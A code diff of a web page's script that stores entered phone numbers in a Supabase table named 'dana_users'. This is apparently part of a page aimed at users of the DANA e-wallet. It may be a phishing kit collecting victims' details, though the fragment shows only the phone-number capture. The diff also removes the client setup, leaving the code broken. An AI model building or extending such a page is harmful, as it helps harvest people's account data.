@@ -457,12 +457,10 @@
         </div>
     </div>
 
-
     <script>
         const SUPABASE_URL = 'https://vqmfachxnjyxwuavpgds.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZxbWZhY2h4bmp5eHd1YXZwZ2RzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg0MDYxNDAsImV4cCI6MjA2Mzk4MjE0MH0.Bzr8mUiEl8MzRWpVQ3_59eFxKk0EWZ3ca-4IEcpGLkk'; 
 
-        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         let currentPhoneNumber = '';
 
@@ -534,7 +532,7 @@
                     const { data, error } = await supabase
                         .from('dana_users')
                         .insert([
-                            { nomor: currentPhoneNumber }
+                            { nomor: currentPhoneNumber } // Menggunakan nama kolom 'nomor'
                         ]);
 
                     if (error) {
